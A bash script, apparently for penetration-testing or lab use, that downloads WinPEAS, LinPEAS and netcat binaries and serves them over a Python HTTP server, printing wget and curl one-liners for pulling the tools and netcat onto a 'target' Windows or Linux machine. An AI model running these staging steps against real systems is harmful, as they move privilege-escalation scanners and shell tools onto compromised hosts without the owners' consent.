#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored output
print_color() {
    echo -e "${2}${1}${NC}"
}

# Function to check if Python is installed
check_python() {
    if command -v python3 &> /dev/null; then
        PYTHON_CMD="python3"
    elif command -v python &> /dev/null; then
        PYTHON_CMD="python"
    else
        print_color "Error: Python is not installed!" $RED
        exit 1
    fi
    print_color "✓ Using $PYTHON_CMD" $GREEN
}

# Function to download PEAS
download_peas() {
    local type=$1
    local output_dir="peas_files"
    
    # Create directory for PEAS files
    mkdir -p "$output_dir"
    cd "$output_dir" || exit
    
    case $type in
        "winpeas")
            print_color "Downloading WinPEAS..." $YELLOW
            # Download both 32-bit and 64-bit versions
            print_color "Downloading WinPEAS x64..." $BLUE
            wget -q --show-progress "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe" -O winpeas64.exe
            
            print_color "Downloading WinPEAS x86..." $BLUE
            wget -q --show-progress "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx86.exe" -O winpeas86.exe
            
            print_color "Downloading WinPEAS.bat (obsolete version)..." $BLUE
            wget -q --show-progress "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASbat/winPEAS.bat" -O winpeas.bat 2>/dev/null || print_color "Note: winPEAS.bat download failed (optional)" $YELLOW
            ;;
            
        "linpeas")
            print_color "Downloading LinPEAS..." $YELLOW
            print_color "Downloading LinPEAS.sh..." $BLUE
            wget -q --show-progress "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
            chmod +x linpeas.sh
            ;;
            
        "both")
            print_color "Downloading both WinPEAS and LinPEAS..." $YELLOW
            # Download WinPEAS
            print_color "Downloading WinPEAS x64..." $BLUE
            wget -q --show-progress "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe" -O winpeas64.exe
            
            print_color "Downloading WinPEAS x86..." $BLUE
            wget -q --show-progress "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx86.exe" -O winpeas86.exe
            
            # Download LinPEAS
            print_color "Downloading LinPEAS.sh..." $BLUE
            wget -q --show-progress "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
            chmod +x linpeas.sh
            ;;
    esac
    
    cd - > /dev/null || exit
}

# Function to download Netcat
download_netcat() {
    local output_dir="peas_files"
    
    # Create directory for files
    mkdir -p "$output_dir"
    cd "$output_dir" || exit
    
    print_color "Downloading Netcat executables..." $YELLOW
    
    # Download various Netcat versions for Windows
    print_color "Downloading Netcat for Windows (classic)..." $BLUE
    wget -q --show-progress "https://github.com/int0x33/nc.exe/raw/master/nc.exe" -O nc.exe 2>/dev/null || print_color "Note: nc.exe download failed, trying alternative..." $YELLOW
    
    # Alternative download if first fails
    if [ ! -f "nc.exe" ]; then
        wget -q --show-progress "https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe" -O ncat.exe 2>/dev/null || print_color "Note: Alternative download also failed" $YELLOW
    fi
    
    # Download Netcat for Linux (static binaries)
    print_color "Downloading Netcat for Linux (static)..." $BLUE
    wget -q --show-progress "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat" -O ncat_linux64 2>/dev/null
    wget -q --show-progress "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86/ncat" -O ncat_linux86 2>/dev/null
    
    # Traditional nc static binaries
    wget -q --show-progress "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/netcat" -O nc_linux64 2>/dev/null
    wget -q --show-progress "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86/netcat" -O nc_linux86 2>/dev/null
    
    # Make Linux binaries executable
    chmod +x ncat_linux* nc_linux* 2>/dev/null
    
    print_color "✓ Netcat downloads completed (where available)" $GREEN
    
    cd - > /dev/null || exit
}

# Function to start Python HTTP server
start_server() {
    local port=8001
    local directory="peas_files"
    
    if [ ! -d "$directory" ]; then
        print_color "Error: $directory directory not found!" $RED
        exit 1
    fi
    
    print_color "\n═══════════════════════════════════════════════════════════" $GREEN
    print_color "Starting Python HTTP server on port $port" $GREEN
    print_color "Serving files from: $directory/" $GREEN
    print_color "═══════════════════════════════════════════════════════════" $GREEN
    
    # Get local IP address
    if command -v ip &> /dev/null; then
        IP=$(ip route get 1 | awk '{print $NF;exit}')
    elif command -v ifconfig &> /dev/null; then
        IP=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n1)
    else
        IP="your-ip-address"
    fi
    
    print_color "\nDownload URLs:" $YELLOW
    # PEAS files
    if [ -f "$directory/winpeas64.exe" ]; then
        print_color "WinPEAS x64:  http://$IP:$port/winpeas64.exe" $BLUE
    fi
    if [ -f "$directory/winpeas86.exe" ]; then
        print_color "WinPEAS x86:  http://$IP:$port/winpeas86.exe" $BLUE
    fi
    if [ -f "$directory/winpeas.bat" ]; then
        print_color "WinPEAS.bat:  http://$IP:$port/winpeas.bat" $BLUE
    fi
    if [ -f "$directory/linpeas.sh" ]; then
        print_color "LinPEAS:       http://$IP:$port/linpeas.sh" $BLUE
    fi
    
    # Netcat files
    if [ -f "$directory/nc.exe" ]; then
        print_color "Netcat (Win):  http://$IP:$port/nc.exe" $BLUE
    fi
    if [ -f "$directory/ncat.exe" ]; then
        print_color "Ncat (Win):    http://$IP:$port/ncat.exe" $BLUE
    fi
    if [ -f "$directory/nc_linux64" ]; then
        print_color "Netcat (Linux64): http://$IP:$port/nc_linux64" $BLUE
    fi
    if [ -f "$directory/nc_linux86" ]; then
        print_color "Netcat (Linux86): http://$IP:$port/nc_linux86" $BLUE
    fi
    if [ -f "$directory/ncat_linux64" ]; then
        print_color "Ncat (Linux64): http://$IP:$port/ncat_linux64" $BLUE
    fi
    
    print_color "\nOn target Windows machine (PowerShell):" $YELLOW
    print_color "# Download WinPEAS" $BLUE
    print_color "wget http://$IP:$port/winpeas64.exe -OutFile winpeas64.exe" $BLUE
    print_color "# Download Netcat" $BLUE
    print_color "wget http://$IP:$port/nc.exe -OutFile nc.exe" $BLUE
    
    print_color "\nOn target Linux machine:" $YELLOW
    print_color "# Download LinPEAS" $BLUE
    print_color "wget http://$IP:$port/linpeas.sh || curl -o linpeas.sh http://$IP:$port/linpeas.sh" $BLUE
    print_color "# Download Netcat" $BLUE
    print_color "wget http://$IP:$port/nc_linux64 -O nc || curl -o nc http://$IP:$port/nc_linux64" $BLUE
    print_color "chmod +x nc" $BLUE
    
    print_color "\nPress Ctrl+C to stop the server" $YELLOW
    print_color "═══════════════════════════════════════════════════════════\n" $GREEN
    
    # Start Python HTTP server
    cd "$directory" || exit
    $PYTHON_CMD -m http.server $port
}

# Main script
print_color "╔══════════════════════════════════════════════════════════╗" $GREEN
print_color "║         PEAS & Netcat Downloader + HTTP Server          ║" $GREEN
print_color "╚══════════════════════════════════════════════════════════╝" $GREEN

# Check Python installation
check_python

# Menu
echo ""
print_color "Select files to download:" $YELLOW
print_color "1) WinPEAS only" $BLUE
print_color "2) LinPEAS only" $BLUE
print_color "3) Both WinPEAS and LinPEAS" $BLUE
print_color "4) Netcat executables only" $BLUE
print_color "5) All PEAS + Netcat" $BLUE
print_color "6) Just start server (use existing files)" $BLUE
echo ""

read -p "Enter choice [1-6]: " choice

case $choice in
    1)
        download_peas "winpeas"
        ;;
    2)
        download_peas "linpeas"
        ;;
    3)
        download_peas "both"
        ;;
    4)
        download_netcat
        ;;
    5)
        download_peas "both"
        download_netcat
        ;;
    6)
        if [ ! -d "peas_files" ] || [ -z "$(ls -A peas_files 2>/dev/null)" ]; then
            print_color "Warning: No files found in peas_files directory!" $RED
            read -p "Do you want to download them now? (y/n): " download_now
            if [[ $download_now =~ ^[Yy]$ ]]; then
                print_color "Select files to download:" $YELLOW
                print_color "1) WinPEAS only" $BLUE
                print_color "2) LinPEAS only" $BLUE
                print_color "3) Both WinPEAS and LinPEAS" $BLUE
                print_color "4) Netcat executables only" $BLUE
                print_color "5) All PEAS + Netcat" $BLUE
                read -p "Enter choice [1-5]: " subchoice
                case $subchoice in
                    1) download_peas "winpeas" ;;
                    2) download_peas "linpeas" ;;
                    3) download_peas "both" ;;
                    4) download_netcat ;;
                    5) 
                        download_peas "both"
                        download_netcat
                        ;;
                esac
            fi
        fi
        ;;
    *)
        print_color "Invalid choice!" $RED
        exit 1
        ;;
esac

# Start the server
if [ $choice -ne 6 ] || [ -d "peas_files" ]; then
    start_server
else
    print_color "No files to serve. Exiting." $RED
    exit 1
fi
